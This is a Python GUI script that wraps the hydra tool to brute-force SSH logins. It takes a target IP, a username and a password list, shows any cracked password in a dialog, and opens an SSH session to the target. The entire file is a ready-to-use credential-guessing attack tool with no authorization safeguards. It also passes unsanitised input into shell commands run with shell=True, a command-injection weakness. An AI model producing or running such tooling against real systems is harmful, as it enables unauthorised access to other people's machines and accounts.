import subprocess
import customtkinter
from CTkMessagebox import CTkMessagebox

# Global variable to store the found password
found_password = ""

def start_brute_force():
    global found_password
    
    target_ip = ip_entry.get()
    username = username_entry.get()
    password_file = password_file_entry.get()
    command = f"hydra -l {username} -P {password_file} {target_ip} ssh"
    
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            output = result.stdout.strip().split('\n')
            for line in output:
                if "login:" in line:
                    found_password = line.split(" ")[-1]
                    CTkMessagebox(title="Success", message=f"Password found: {found_password}")
                    return
            CTkMessagebox(title="Success", message="Password found but couldn't retrieve.")
        else:
            CTkMessagebox(title="Failed", message="Brute force unsuccessful.")
    except FileNotFoundError:
        CTkMessagebox(title="Error", message="Hydra not found. Make sure Hydra is installed.")

def open_ssh_connection():
    target_ip = ip_entry.get()
    username = username_entry.get()
    global found_password
    password = found_password
    if password:
        command = f"x-terminal-emulator -e ssh {username}@{target_ip}"
        subprocess.run(command, shell=True)
    else:
        CTkMessagebox(title="Error", message="No password found. Please run brute force first.")

# Create the GUI
root = customtkinter.CTk()
root.title("SSH Brute Force with Hydra")

ip_label = customtkinter.CTkLabel(root, text="Target IP:")
ip_label.grid(row=0, column=0, padx=10, pady=5)
ip_entry = customtkinter.CTkEntry(root)
ip_entry.grid(row=0, column=1, padx=10, pady=5)

username_label = customtkinter.CTkLabel(root, text="Username:")
username_label.grid(row=1, column=0, padx=10, pady=5)
username_entry = customtkinter.CTkEntry(root)
username_entry.grid(row=1, column=1, padx=10, pady=5)

password_file_label = customtkinter.CTkLabel(root, text="Password File:")
password_file_label.grid(row=2, column=0, padx=10, pady=5)
password_file_entry = customtkinter.CTkEntry(root)
password_file_entry.grid(row=2, column=1, padx=10, pady=5)

start_button = customtkinter.CTkButton(root, text="Start Brute Force", command=start_brute_force)
start_button.grid(row=3, column=0, columnspan=2, padx=10, pady=5)

open_connection_button = customtkinter.CTkButton(root, text="Open SSH Connection", command=open_ssh_connection)
open_connection_button.grid(row=4, column=0, columnspan=2, padx=10, pady=5)

root.mainloop()
